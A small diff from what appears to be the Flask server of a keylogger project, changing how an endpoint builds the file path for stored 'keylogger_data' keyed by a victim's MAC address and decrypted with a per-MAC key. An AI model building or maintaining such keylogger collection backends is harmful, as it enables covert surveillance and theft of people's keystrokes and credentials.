@@ -86,7 +86,7 @@ def get_by_date():
     date = request.args.get('date')
     mac = request.args.get('mac')
     key = Decrypt.get_key(mac)
-    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}'
+    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}.json'
     try:
         with open(path, 'r', encoding='utf-8', errors='replace') as f:
             file_data = f.read()
